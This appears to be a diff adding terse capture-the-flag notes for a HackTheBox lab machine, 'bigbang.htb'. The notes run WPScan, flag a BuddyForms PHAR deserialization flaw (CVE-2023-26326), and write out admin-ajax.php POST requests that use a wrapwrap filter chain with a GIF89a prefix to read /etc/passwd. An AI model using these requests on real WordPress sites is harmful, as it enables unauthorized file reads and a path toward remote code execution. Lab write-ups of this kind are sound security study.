@@ -1,0 +1,15 @@
+edit /etc/hosts -> <ip> bigbang.htb blog.bigbang.htb
+
+sudo podman run --rm   wpscanteam/wpscan   --url http://blog.bigbang.htb   --api-token <token from wpscan website>
+Server: Apache/2.4.62 (Debian)                                                                                                                                  
+X-Powered-By: PHP/8.3.2
+| [!] Title: BuddyForms < 2.7.8 - Unauthenticated PHAR Deserialization(CVE-2023-26326) -> RCE
+
+burpsuite -> grep any packet in blog.bigbang.htb -> change request method ->
+POST /wp-admin/admin-ajax.php
+...
+action=upload_image_from_url&url=/etc/passwd&id=1&accepted_fils=image/gif -- fail due to invalid file type
+
+install wrapwrap -> python3 wrapwrap.py '/etc/passwd' 'GIF89a' '' 0 -> cat chain.txt -><chain>
+
+action=upload_image_from_url&url=<chain>&id=1&accepted_fils=image/gif -- success due to prefix GIF89a
